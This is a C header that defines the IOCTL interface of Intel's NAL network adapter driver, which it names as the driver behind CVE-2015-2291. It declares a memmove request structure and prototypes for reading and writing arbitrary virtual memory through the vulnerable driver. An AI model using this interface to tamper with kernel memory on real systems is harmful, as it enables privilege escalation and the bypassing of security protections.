/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       NAL.H
*
*  VERSION:     1.10
*
*  DATE:        15 Apr 2021
*
*  Intel Network Adapter iQVM64 driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once
#include <Windows.h>

//
// INTEL NAL driver interface for CVE-2015-2291.
//

#define INTEL_DEVICE_TYPE               (DWORD)0x8086
#define INTEL_DEVICE_FUNCTION           (DWORD)2049

#define NAL_FUNCID_MEMMOVE              (DWORD)0x33

#define IOCTL_NAL_MANAGE  \
    CTL_CODE(INTEL_DEVICE_TYPE, INTEL_DEVICE_FUNCTION, METHOD_NEITHER, FILE_ANY_ACCESS) //0x80862007


typedef struct _NAL_REQUEST_HEADER {
    ULONG_PTR FunctionId;
    ULONG_PTR Unused0;
} NAL_REQUEST_HEADER, * PNAL_REQUEST_HEADER;

typedef struct _NAL_MEMMOVE {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR SourceAddress;
    ULONG_PTR DestinationAddress;
    ULONG_PTR Length;
} NAL_MEMMOVE, * PNAL_MEMMOVE;

NTSTATUS NalCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Buffer,
    _In_ ULONG Size);

NTSTATUS NalReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

NTSTATUS NalWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);